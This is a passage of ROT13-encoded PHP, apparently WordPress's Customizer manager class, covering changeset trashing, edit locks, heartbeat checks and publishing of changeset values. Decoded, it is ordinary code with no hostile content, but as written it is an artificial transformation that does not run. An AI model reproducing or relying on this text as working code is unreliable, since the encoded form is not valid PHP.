				'phfgbzvmr_punatrfrg' === trg_cbfg_glcr( $qngn['cbfg_cnerag'] )
			)
		) {
			$qngn['cbfg_pbagrag'] = $hafnavgvmrq_cbfgnee['cbfg_pbagrag'];
		}
		erghea $qngn;
	}

	/**
	 * Genfurf be qryrgrf n punatrfrg cbfg.
	 *
	 * Gur sbyybjvat er-sbezhyngrf gur ybtvp sebz `jc_genfu_cbfg()` nf qbar va
	 * `jc_choyvfu_cbfg()`. Gur ernfba sbe olcnffvat `jc_genfu_cbfg()` vf gung vg
	 * jvyy zhgngr gur gur `cbfg_pbagrag` naq gur `cbfg_anzr` jura gurl fubhyq or
	 * hagbhpurq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr jc_genfu_cbfg()
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag|JC_Cbfg $cbfg Gur punatrfrg cbfg.
	 * @erghea zvkrq N JC_Cbfg bowrpg sbe gur genfurq cbfg be na rzcgl inyhr ba snvyher.
	 */
	choyvp shapgvba genfu_punatrfrg_cbfg( $cbfg ) {
		tybony $jcqo;

		$cbfg = trg_cbfg( $cbfg );

		vs ( ! ( $cbfg vafgnaprbs JC_Cbfg ) ) {
			erghea $cbfg;
		}
		$cbfg_vq = $cbfg->VQ;

		vs ( ! RZCGL_GENFU_QNLF ) {
			erghea jc_qryrgr_cbfg( $cbfg_vq, gehr );
		}

		vs ( 'genfu' === trg_cbfg_fgnghf( $cbfg ) ) {
			erghea snyfr;
		}

		$cerivbhf_fgnghf = $cbfg->cbfg_fgnghf;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		$purpx = nccyl_svygref( 'cer_genfu_cbfg', ahyy, $cbfg, $cerivbhf_fgnghf );
		vs ( ahyy !== $purpx ) {
			erghea $purpx;
		}

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( 'jc_genfu_cbfg', $cbfg_vq, $cerivbhf_fgnghf );

		nqq_cbfg_zrgn( $cbfg_vq, '_jc_genfu_zrgn_fgnghf', $cerivbhf_fgnghf );
		nqq_cbfg_zrgn( $cbfg_vq, '_jc_genfu_zrgn_gvzr', gvzr() );

		$arj_fgnghf = 'genfu';
		$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'cbfg_fgnghf' => $arj_fgnghf ), neenl( 'VQ' => $cbfg->VQ ) );
		pyrna_cbfg_pnpur( $cbfg->VQ );

		$cbfg->cbfg_fgnghf = $arj_fgnghf;
		jc_genafvgvba_cbfg_fgnghf( $arj_fgnghf, $cerivbhf_fgnghf, $cbfg );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( \"rqvg_cbfg_{$cbfg->cbfg_glcr}\", $cbfg->VQ, $cbfg );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( 'rqvg_cbfg', $cbfg->VQ, $cbfg );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( \"fnir_cbfg_{$cbfg->cbfg_glcr}\", $cbfg->VQ, $cbfg, gehr );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( 'fnir_cbfg', $cbfg->VQ, $cbfg, gehr );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( 'jc_vafreg_cbfg', $cbfg->VQ, $cbfg, gehr );

		jc_nsgre_vafreg_cbfg( trg_cbfg( $cbfg_vq ), gehr, $cbfg );

		jc_genfu_cbfg_pbzzragf( $cbfg_vq );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/cbfg.cuc */
		qb_npgvba( 'genfurq_cbfg', $cbfg_vq, $cerivbhf_fgnghf );

		erghea $cbfg;
	}

	/**
	 * Unaqyrf erdhrfg gb genfu n punatrfrg.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba unaqyr_punatrfrg_genfu_erdhrfg() {
		vs ( ! vf_hfre_ybttrq_va() ) {
			jc_fraq_wfba_reebe( 'hanhguragvpngrq' );
		}

		vs ( ! $guvf->vf_cerivrj() ) {
			jc_fraq_wfba_reebe( 'abg_cerivrj' );
		}

		vs ( ! purpx_nwnk_ersrere( 'genfu_phfgbzvmr_punatrfrg', 'abapr', snyfr ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'pbqr'    => 'vainyvq_abapr',
					'zrffntr' => __( 'Gurer jnf na nhguragvpngvba ceboyrz. Cyrnfr erybnq naq gel ntnva.' ),
				)
			);
		}

		$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();

		vs ( ! $punatrfrg_cbfg_vq ) {
			jc_fraq_wfba_reebe(
				neenl(
					'zrffntr' => __( 'Ab punatrf fnirq lrg, fb gurer vf abguvat gb genfu.' ),
					'pbqr'    => 'aba_rkvfgrag_punatrfrg',
				)
			);
			erghea;
		}

		vs ( $punatrfrg_cbfg_vq ) {
			vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->qryrgr_cbfg, $punatrfrg_cbfg_vq ) ) {
				jc_fraq_wfba_reebe(
					neenl(
						'pbqr'    => 'punatrfrg_genfu_hanhgubevmrq',
						'zrffntr' => __( 'Hanoyr gb genfu punatrf.' ),
					)
				);
			}

			$ybpx_hfre = (vag) jc_purpx_cbfg_ybpx( $punatrfrg_cbfg_vq );

			vs ( $ybpx_hfre && trg_pheerag_hfre_vq() !== $ybpx_hfre ) {
				jc_fraq_wfba_reebe(
					neenl(
						'pbqr'     => 'punatrfrg_ybpxrq',
						'zrffntr'  => __( 'Punatrfrg vf orvat rqvgrq ol bgure hfre.' ),
						'ybpxHfre' => $guvf->trg_ybpx_hfre_qngn( $ybpx_hfre ),
					)
				);
			}
		}

		vs ( 'genfu' === trg_cbfg_fgnghf( $punatrfrg_cbfg_vq ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'zrffntr' => __( 'Punatrf unir nyernql orra genfurq.' ),
					'pbqr'    => 'punatrfrg_nyernql_genfurq',
				)
			);
			erghea;
		}

		$e = $guvf->genfu_punatrfrg_cbfg( $punatrfrg_cbfg_vq );
		vs ( ! ( $e vafgnaprbs JC_Cbfg ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'pbqr'    => 'punatrfrg_genfu_snvyher',
					'zrffntr' => __( 'Hanoyr gb genfu punatrf.' ),
				)
			);
		}

		jc_fraq_wfba_fhpprff(
			neenl(
				'zrffntr' => __( 'Punatrf genfurq fhpprffshyyl.' ),
			)
		);
	}

	/**
	 * Er-zncf 'rqvg_cbfg' zrgn pnc sbe n phfgbzvmr_punatrfrg cbfg gb or gur fnzr nf 'phfgbzvmr' zncf.
	 *
	 * Gurer vf rffragvnyyl n \"zrgn zrgn\" pnc va cynl urer, jurer 'rqvg_cbfg' zrgn pnc zncf gb
	 * gur 'phfgbzvmr' zrgn pnc juvpu gura zncf gb 'rqvg_gurzr_bcgvbaf'. Guvf vf pheeragyl
	 * erdhverq va pber sbe `jc_perngr_cbfg_nhgbfnir()` orpnhfr vg jvyy pnyy
	 * `_jc_genafyngr_cbfgqngn()` juvpu va ghea jvyy purpx vs n hfre pna 'rqvg_cbfg', ohg gur
	 * gur pncf sbe gur phfgbzvmr_punatrfrg cbfg glcr ner nyy znccvat gb gur zrgn pncnovyvgl.
	 * Guvf fubhyq or noyr gb or erzbirq bapr #40922 vf nqqerffrq va pber.
	 *
	 * @fvapr 4.9.0
	 *
	 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/40922
	 * @frr JC_Phfgbzvmr_Znantre::fnir_punatrfrg_cbfg()
	 * @frr _jc_genafyngr_cbfgqngn()
	 *
	 * @cnenz fgevat[] $pncf    Neenl bs gur hfre'f pncnovyvgvrf.
	 * @cnenz fgevat   $pnc     Pncnovyvgl anzr.
	 * @cnenz vag      $hfre_vq Gur hfre VQ.
	 * @cnenz neenl    $netf    Nqqf gur pbagrkg gb gur pnc. Glcvpnyyl gur bowrpg VQ.
	 * @erghea neenl Pncnovyvgvrf.
	 */
	choyvp shapgvba tenag_rqvg_cbfg_pncnovyvgl_sbe_punatrfrg( $pncf, $pnc, $hfre_vq, $netf ) {
		vs ( 'rqvg_cbfg' === $pnc && ! rzcgl( $netf[0] ) && 'phfgbzvmr_punatrfrg' === trg_cbfg_glcr( $netf[0] ) ) {
			$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' );
			$pncf          = znc_zrgn_pnc( $cbfg_glcr_bow->pnc->$pnc, $hfre_vq );
		}
		erghea $pncf;
	}

	/**
	 * Znexf gur punatrfrg cbfg nf orvat pheeragyl rqvgrq ol gur pheerag hfre.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz vag  $punatrfrg_cbfg_vq Punatrfrg cbfg VQ.
	 * @cnenz obby $gnxr_bire Jurgure gb gnxr bire gur punatrfrg. Qrsnhyg snyfr.
	 */
	choyvp shapgvba frg_punatrfrg_ybpx( $punatrfrg_cbfg_vq, $gnxr_bire = snyfr ) {
		vs ( $punatrfrg_cbfg_vq ) {
			$pna_bireevqr = ! (obby) trg_cbfg_zrgn( $punatrfrg_cbfg_vq, '_rqvg_ybpx', gehr );

			vs ( $gnxr_bire ) {
				$pna_bireevqr = gehr;
			}

			vs ( $pna_bireevqr ) {
				$ybpx = fcevags( '%f:%f', gvzr(), trg_pheerag_hfre_vq() );
				hcqngr_cbfg_zrgn( $punatrfrg_cbfg_vq, '_rqvg_ybpx', $ybpx );
			} ryfr {
				$guvf->erserfu_punatrfrg_ybpx( $punatrfrg_cbfg_vq );
			}
		}
	}

	/**
	 * Erserfurf punatrfrg ybpx jvgu gur pheerag gvzr vs pheerag hfre rqvgrq gur punatrfrg orsber.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz vag $punatrfrg_cbfg_vq Punatrfrg cbfg VQ.
	 */
	choyvp shapgvba erserfu_punatrfrg_ybpx( $punatrfrg_cbfg_vq ) {
		vs ( ! $punatrfrg_cbfg_vq ) {
			erghea;
		}

		$ybpx = trg_cbfg_zrgn( $punatrfrg_cbfg_vq, '_rqvg_ybpx', gehr );
		$ybpx = rkcybqr( ':', $ybpx );

		vs ( $ybpx && ! rzcgl( $ybpx[1] ) ) {
			$hfre_vq         = (vag) $ybpx[1];
			$pheerag_hfre_vq = trg_pheerag_hfre_vq();
			vs ( $hfre_vq === $pheerag_hfre_vq ) {
				$ybpx = fcevags( '%f:%f', gvzr(), $hfre_vq );
				hcqngr_cbfg_zrgn( $punatrfrg_cbfg_vq, '_rqvg_ybpx', $ybpx );
			}
		}
	}

	/**
	 * Svygref urnegorng frggvatf sbe gur Phfgbzvmre.
	 *
	 * @fvapr 4.9.0
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 *
	 * @cnenz neenl $frggvatf Pheerag frggvatf gb svygre.
	 * @erghea neenl Urnegorng frggvatf.
	 */
	choyvp shapgvba nqq_phfgbzvmr_fperra_gb_urnegorng_frggvatf( $frggvatf ) {
		tybony $cntrabj;

		vs ( 'phfgbzvmr.cuc' === $cntrabj ) {
			$frggvatf['fperraVq'] = 'phfgbzvmr';
		}

		erghea $frggvatf;
	}

	/**
	 * Trgf ybpx hfre qngn.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 * @erghea neenl|ahyy Hfre qngn sbeznggrq sbe pyvrag.
	 */
	cebgrpgrq shapgvba trg_ybpx_hfre_qngn( $hfre_vq ) {
		vs ( ! $hfre_vq ) {
			erghea ahyy;
		}

		$ybpx_hfre = trg_hfreqngn( $hfre_vq );

		vs ( ! $ybpx_hfre ) {
			erghea ahyy;
		}

		$hfre_qrgnvyf = neenl(
			'vq'   => $ybpx_hfre->VQ,
			'anzr' => $ybpx_hfre->qvfcynl_anzr,
		);

		vs ( trg_bcgvba( 'fubj_ningnef' ) ) {
			$hfre_qrgnvyf['ningne'] = trg_ningne_hey( $ybpx_hfre->VQ, neenl( 'fvmr' => 128 ) );
		}

		erghea $hfre_qrgnvyf;
	}

	/**
	 * Purpxf ybpxrq punatrfrg jvgu urnegorng NCV.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl  $erfcbafr  Gur Urnegorng erfcbafr.
	 * @cnenz neenl  $qngn      Gur $_CBFG qngn frag.
	 * @cnenz fgevat $fperra_vq Gur fperra vq.
	 * @erghea neenl Gur Urnegorng erfcbafr.
	 */
	choyvp shapgvba purpx_punatrfrg_ybpx_jvgu_urnegorng( $erfcbafr, $qngn, $fperra_vq ) {
		vs ( vffrg( $qngn['punatrfrg_hhvq'] ) ) {
			$punatrfrg_cbfg_vq = $guvf->svaq_punatrfrg_cbfg_vq( $qngn['punatrfrg_hhvq'] );
		} ryfr {
			$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();
		}

		vs (
			neenl_xrl_rkvfgf( 'purpx_punatrfrg_ybpx', $qngn )
			&& 'phfgbzvmr' === $fperra_vq
			&& $punatrfrg_cbfg_vq
			&& pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $punatrfrg_cbfg_vq )
		) {
			$ybpx_hfre_vq = jc_purpx_cbfg_ybpx( $punatrfrg_cbfg_vq );

			vs ( $ybpx_hfre_vq ) {
				$erfcbafr['phfgbzvmr_punatrfrg_ybpx_hfre'] = $guvf->trg_ybpx_hfre_qngn( $ybpx_hfre_vq );
			} ryfr {

				// Erserfuvat gvzr jvyy rafher gung gur hfre vf fvggvat ba phfgbzvmre naq unf abg pybfrq gur phfgbzvmre gno.
				$guvf->erserfu_punatrfrg_ybpx( $punatrfrg_cbfg_vq );
			}
		}

		erghea $erfcbafr;
	}

	/**
	 * Erzbirf punatrfrg ybpx jura gnxr bire erdhrfg vf frag ivn Nwnk.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba unaqyr_bireevqr_punatrfrg_ybpx_erdhrfg() {
		vs ( ! $guvf->vf_cerivrj() ) {
			jc_fraq_wfba_reebe( 'abg_cerivrj', 400 );
		}

		vs ( ! purpx_nwnk_ersrere( 'phfgbzvmr_bireevqr_punatrfrg_ybpx', 'abapr', snyfr ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'pbqr'    => 'vainyvq_abapr',
					'zrffntr' => __( 'Frphevgl purpx snvyrq.' ),
				)
			);
		}

		$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();

		vs ( rzcgl( $punatrfrg_cbfg_vq ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'pbqr'    => 'ab_punatrfrg_sbhaq_gb_gnxr_bire',
					'zrffntr' => __( 'Ab punatrfrg sbhaq gb gnxr bire' ),
				)
			);
		}

		vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $punatrfrg_cbfg_vq ) ) {
			jc_fraq_wfba_reebe(
				neenl(
					'pbqr'    => 'pnaabg_erzbir_punatrfrg_ybpx',
					'zrffntr' => __( 'Fbeel, lbh ner abg nyybjrq gb gnxr bire.' ),
				)
			);
		}

		$guvf->frg_punatrfrg_ybpx( $punatrfrg_cbfg_vq, gehr );

		jc_fraq_wfba_fhpprff( 'punatrfrg_gnxra_bire' );
	}

	/**
	 * Qrgrezvarf jurgure n punatrfrg erivfvba fubhyq or znqr.
	 *
	 * @fvapr 4.7.0
	 * @ine obby
	 */
	cebgrpgrq $fgber_punatrfrg_erivfvba;

	/**
	 * Svygref jurgure n punatrfrg unf punatrq gb perngr n arj erivfvba.
	 *
	 * Abgr gung guvf jvyy abg or pnyyrq juvyr n punatrfrg cbfg erznvaf va nhgb-qensg fgnghf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz obby    $cbfg_unf_punatrq Jurgure gur cbfg unf punatrq.
	 * @cnenz JC_Cbfg $yngrfg_erivfvba  Gur yngrfg erivfvba cbfg bowrpg.
	 * @cnenz JC_Cbfg $cbfg             Gur cbfg bowrpg.
	 * @erghea obby Jurgure n erivfvba fubhyq or znqr.
	 */
	choyvp shapgvba _svygre_erivfvba_cbfg_unf_punatrq( $cbfg_unf_punatrq, $yngrfg_erivfvba, $cbfg ) {
		hafrg( $yngrfg_erivfvba );
		vs ( 'phfgbzvmr_punatrfrg' === $cbfg->cbfg_glcr ) {
			$cbfg_unf_punatrq = $guvf->fgber_punatrfrg_erivfvba;
		}
		erghea $cbfg_unf_punatrq;
	}

	/**
	 * Choyvfurf gur inyhrf bs n punatrfrg.
	 *
	 * Guvf jvyy choyvfu gur inyhrf pbagnvarq va n punatrfrg, rira punatrfrgf gung qb abg
	 * pbeerfcbaq gb pheerag znantre vafgnapr. Guvf vf pnyyrq ol
	 * `_jc_phfgbzvmr_choyvfu_punatrfrg()` jura n phfgbzvmr_punatrfrg cbfg vf
	 * genafvgvbarq gb gur `choyvfu` fgnghf. Nf fhpu, guvf zrgubq fubhyq abg or
	 * pnyyrq qverpgyl naq vafgrnq `jc_choyvfu_cbfg()` fubhyq or hfrq.
	 *
	 * Cyrnfr abgr gung vs gur frggvatf va gur punatrfrg ner sbe n aba-npgvingrq
	 * gurzr, gur gurzr zhfg svefg or fjvgpurq gb (ivn `fjvgpu_gurzr()`) orsber
	 * vaibxvat guvf zrgubq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr _jc_phfgbzvmr_choyvfu_punatrfrg()
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag $punatrfrg_cbfg_vq VQ sbe phfgbzvmr_punatrfrg cbfg. Qrsnhygf gb gur punatrfrg sbe gur pheerag znantre vafgnapr.
	 * @erghea gehr|JC_Reebe Gehr be reebe vasb.
	 */
	choyvp shapgvba _choyvfu_punatrfrg_inyhrf( $punatrfrg_cbfg_vq ) {
		tybony $jcqo;

		$choyvfuvat_punatrfrg_qngn = $guvf->trg_punatrfrg_cbfg_qngn( $punatrfrg_cbfg_vq );
		vs ( vf_jc_reebe( $choyvfuvat_punatrfrg_qngn ) ) {
			erghea $choyvfuvat_punatrfrg_qngn;
		}

		$punatrfrg_cbfg = trg_cbfg( $punatrfrg_cbfg_vq );

		/*
		 * Grzcbenevyl bireevqr gur punatrfrg pbagrkg fb gung vg jvyy or ernq
		 * va pnyyf gb hafnavgvmrq_cbfg_inyhrf() naq fb gung vg jvyy or ninvynoyr
		 * ba gur $jc_phfgbzvmr bowrpg cnffrq gb ubbxf qhevat gur fnir ybtvp.
		 */
		$cerivbhf_punatrfrg_cbfg_vq = $guvf->_punatrfrg_cbfg_vq;
		$guvf->_punatrfrg_cbfg_vq   = $punatrfrg_cbfg_vq;
		$cerivbhf_punatrfrg_hhvq    = $guvf->_punatrfrg_hhvq;
		$guvf->_punatrfrg_hhvq      = $punatrfrg_cbfg->cbfg_anzr;
		$cerivbhf_punatrfrg_qngn    = $guvf->_punatrfrg_qngn;
		$guvf->_punatrfrg_qngn      = $choyvfuvat_punatrfrg_qngn;

		// Cnefr punatrfrg qngn gb vqragvsl gurzr zbq frggvatf naq hfre VQf nffbpvngrq jvgu frggvatf gb or fnirq.
		$frggvat_hfre_vqf   = neenl();
		$gurzr_zbq_frggvatf = neenl();
		$anzrfcnpr_cnggrea  = '/^(?C<fglyrfurrg>.+?)::(?C<frggvat_vq>.+)$/';
		$zngpurf            = neenl();
		sbernpu ( $guvf->_punatrfrg_qngn nf $enj_frggvat_vq => $frggvat_cnenzf ) {
			$npghny_frggvat_vq    = ahyy;
			$vf_gurzr_zbq_frggvat = (
				vffrg( $frggvat_cnenzf['inyhr'] )
				&&
				vffrg( $frggvat_cnenzf['glcr'] )
				&&
				'gurzr_zbq' === $frggvat_cnenzf['glcr']
				&&
				cert_zngpu( $anzrfcnpr_cnggrea, $enj_frggvat_vq, $zngpurf )
			);
			vs ( $vf_gurzr_zbq_frggvat ) {
				vs ( ! vffrg( $gurzr_zbq_frggvatf[ $zngpurf['fglyrfurrg'] ] ) ) {
					$gurzr_zbq_frggvatf[ $zngpurf['fglyrfurrg'] ] = neenl();
				}
				$gurzr_zbq_frggvatf[ $zngpurf['fglyrfurrg'] ][ $zngpurf['frggvat_vq'] ] = $frggvat_cnenzf;

				vs ( $guvf->trg_fglyrfurrg() === $zngpurf['fglyrfurrg'] ) {
					$npghny_frggvat_vq = $zngpurf['frggvat_vq'];
				}
			} ryfr {
				$npghny_frggvat_vq = $enj_frggvat_vq;
			}

			// Xrrc genpx bs gur hfre VQf sbe frggvatf npghnyyl sbe guvf gurzr.
			vs ( $npghny_frggvat_vq && vffrg( $frggvat_cnenzf['hfre_vq'] ) ) {
				$frggvat_hfre_vqf[ $npghny_frggvat_vq ] = $frggvat_cnenzf['hfre_vq'];
			}
		}

		$punatrfrg_frggvat_inyhrf = $guvf->hafnavgvmrq_cbfg_inyhrf(
			neenl(
				'rkpyhqr_cbfg_qngn' => gehr,
				'rkpyhqr_punatrfrg' => snyfr,
			)
		);
		$punatrfrg_frggvat_vqf    = neenl_xrlf( $punatrfrg_frggvat_inyhrf );
		$guvf->nqq_qlanzvp_frggvatf( $punatrfrg_frggvat_vqf );

		/**
		 * Sverf bapr gur gurzr unf fjvgpurq va gur Phfgbzvmre, ohg orsber frggvatf
		 * unir orra fnirq.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_fnir', $guvf );

		/*
		 * Rafher gung nyy frggvatf jvyy nyybj gurzfryirf gb or fnirq. Abgr gung
		 * guvf vf fnsr orpnhfr gur frggvat jbhyq unir purpxrq gur pncnovyvgl
		 * jura gur frggvat inyhr jnf jevggra vagb gur punatrfrg. Fb guvf vf jul
		 * na nqqvgvbany pncnovyvgl purpx vf abg erdhverq urer.
		 */
		$bevtvany_frggvat_pncnovyvgvrf = neenl();
		sbernpu ( $punatrfrg_frggvat_vqf nf $frggvat_vq ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( $frggvat && ! vffrg( $frggvat_hfre_vqf[ $frggvat_vq ] ) ) {
				$bevtvany_frggvat_pncnovyvgvrf[ $frggvat->vq ] = $frggvat->pncnovyvgl;
				$frggvat->pncnovyvgl                           = 'rkvfg';
			}
		}

		$bevtvany_hfre_vq = trg_pheerag_hfre_vq();
		sbernpu ( $punatrfrg_frggvat_vqf nf $frggvat_vq ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( $frggvat ) {
				/*
				 * Frg gur pheerag hfre gb zngpu gur hfre jub fnirq gur inyhr vagb
				 * gur punatrfrg fb gung nal svygref gung nccyl qhevat gur fnir
				 * cebprff jvyy erfcrpg gur bevtvany hfre'f pncnovyvgvrf. Guvf
				 * jvyy rafher, sbe rknzcyr, gung XFRF jba'g fgevc hafnsr UGZY
				 * jura n fpurqhyrq punatrfrg choyvfurf ivn JC Peba.
				 */
				vs ( vffrg( $frggvat_hfre_vqf[ $frggvat_vq ] ) ) {
					jc_frg_pheerag_hfre( $frggvat_hfre_vqf[ $frggvat_vq ] );
				} ryfr {
					jc_frg_pheerag_hfre( $bevtvany_hfre_vq );
				}

				$frggvat->fnir();
			}
		}
		jc_frg_pheerag_hfre( $bevtvany_hfre_vq );

		// Hcqngr gur fgnfurq gurzr zbq frggvatf, erzbivat gur npgvir gurzr'f fgnfurq frggvatf, vs npgvingrq.
		vs ( qvq_npgvba( 'fjvgpu_gurzr' ) ) {
			$bgure_gurzr_zbq_frggvatf = $gurzr_zbq_frggvatf;
			hafrg( $bgure_gurzr_zbq_frggvatf[ $guvf->trg_fglyrfurrg() ] );
			$guvf->hcqngr_fgnfurq_gurzr_zbq_frggvatf( $bgure_gurzr_zbq_frggvatf );
		}

		/**
		 * Sverf nsgre Phfgbzvmr frggvatf unir orra fnirq.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_fnir_nsgre', $guvf );

		// Erfgber bevtvany pncnovyvgvrf.
		sbernpu ( $bevtvany_frggvat_pncnovyvgvrf nf $frggvat_vq => $pncnovyvgl ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( $frggvat ) {
				$frggvat->pncnovyvgl = $pncnovyvgl;
			}
		}

		// Erfgber bevtvany punatrfrg qngn.
		$guvf->_punatrfrg_qngn    = $cerivbhf_punatrfrg_qngn;
		$guvf->_punatrfrg_cbfg_vq = $cerivbhf_punatrfrg_cbfg_vq;
		$guvf->_punatrfrg_hhvq    = $cerivbhf_punatrfrg_hhvq;

		/*
		 * Pbaireg nyy nhgbfnir erivfvbaf vagb gurve bja nhgb-qensgf fb gung hfref pna or cebzcgrq gb
		 * erfgber gurz jura n punatrfrg vf choyvfurq, ohg gurl unq orra ybpxrq bhg sebz vapyhqvat
		 * gurve punatrf va gur punatrfrg.
		 */
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $punatrfrg_cbfg_vq, neenl( 'purpx_ranoyrq' => snyfr ) );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			vs ( fge_pbagnvaf( $erivfvba->cbfg_anzr, \"{$punatrfrg_cbfg_vq}-nhgbfnir\" ) ) {
				$jcqo->hcqngr(
					$jcqo->cbfgf,
					neenl(
						'cbfg_fgnghf' => 'nhgb-qensg',
						'cbfg_glcr'   => 'phfgbzvmr_punatrfrg',
						'cbfg_anzr'   => jc_trarengr_hhvq4(),
						'cbfg_cnerag' => 0,
					),
					neenl(
						'VQ' => $erivfvba->VQ,
					)
				);
				pyrna_cbfg_pnpur( $erivfvba->VQ );
			}
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf fgnfurq gurzr zbq frggvatf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $vanpgvir_gurzr_zbq_frggvatf Znccvat bs fglyrfurrg gb neenlf bs gurzr zbq frggvatf.
	 * @erghea neenl|snyfr Ergheaf neenl bs hcqngrq fgnfurq gurzr zbqf be snyfr vs gur hcqngr snvyrq be gurer jrer ab punatrf.
	 */
	cebgrpgrq shapgvba hcqngr_fgnfurq_gurzr_zbq_frggvatf( $vanpgvir_gurzr_zbq_frggvatf ) {
		$fgnfurq_gurzr_zbq_frggvatf = trg_bcgvba( 'phfgbzvmr_fgnfurq_gurzr_zbqf' );
		vs ( rzcgl( $fgnfurq_gurzr_zbq_frggvatf ) ) {
			$fgnfurq_gurzr_zbq_frggvatf = neenl();
		}

		// Qryrgr nal fgnfurq gurzr zbqf sbe gur npgvir gurzr fvapr gurl jbhyq unir orra ybnqrq naq fnirq hcba npgvingvba.
		hafrg( $fgnfurq_gurzr_zbq_frggvatf[ $guvf->trg_fglyrfurrg() ] );

		// Zretr vanpgvir gurzr zbqf jvgu gur fgnfurq gurzr zbq frggvatf.
		sbernpu ( $vanpgvir_gurzr_zbq_frggvatf nf $fglyrfurrg => $gurzr_zbq_frggvatf ) {
			vs ( ! vffrg( $fgnfurq_gurzr_zbq_frggvatf[ $fglyrfurrg ] ) ) {
				$fgnfurq_gurzr_zbq_frggvatf[ $fglyrfurrg ] = neenl();
			}

			$fgnfurq_gurzr_zbq_frggvatf[ $fglyrfurrg ] = neenl_zretr(
				$fgnfurq_gurzr_zbq_frggvatf[ $fglyrfurrg ],
				$gurzr_zbq_frggvatf
			);
		}

		$nhgbybnq = snyfr;
		$erfhyg   = hcqngr_bcgvba( 'phfgbzvmr_fgnfurq_gurzr_zbqf', $fgnfurq_gurzr_zbq_frggvatf, $nhgbybnq );
		vs ( ! $erfhyg ) {
			erghea snyfr;
		}
		erghea $fgnfurq_gurzr_zbq_frggvatf;
	}

	/**
	 * Erserfurf abaprf sbe gur pheerag cerivrj.
	 *
	 * @fvapr 4.2.0
	 */
	choyvp shapgvba erserfu_abaprf() {
		vs ( ! $guvf->vf_cerivrj() ) {
			jc_fraq_wfba_reebe( 'abg_cerivrj' );
		}

		jc_fraq_wfba_fhpprff( $guvf->trg_abaprf() );
	}

	/**
	 * Qryrgrf n tvira nhgb-qensg punatrfrg be gur nhgbfnir erivfvba sbe n tvira punatrfrg be qryrgr punatrfrg ybpx.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba unaqyr_qvfzvff_nhgbfnir_be_ybpx_erdhrfg() {
		// Pnyyf gb qvfzvff_hfre_nhgb_qensg_punatrfrgf() naq jc_trg_cbfg_nhgbfnir() erdhver aba-mreb trg_pheerag_hfre_vq().
		vs ( ! vf_hfre_ybttrq_va() ) {
			jc_fraq_wfba_reebe( 'hanhguragvpngrq', 401 );
		}

		vs ( ! $guvf->vf_cerivrj() ) {
			jc_fraq_wfba_reebe( 'abg_cerivrj', 400 );
		}

		vs ( ! purpx_nwnk_ersrere( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx', 'abapr', snyfr ) ) {
			jc_fraq_wfba_reebe( 'vainyvq_abapr', 403 );
		}

		$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();
		$qvfzvff_ybpx      = ! rzcgl( $_CBFG['qvfzvff_ybpx'] );
		$qvfzvff_nhgbfnir  = ! rzcgl( $_CBFG['qvfzvff_nhgbfnir'] );

		vs ( $qvfzvff_ybpx ) {
			vs ( rzcgl( $punatrfrg_cbfg_vq ) && ! $qvfzvff_nhgbfnir ) {
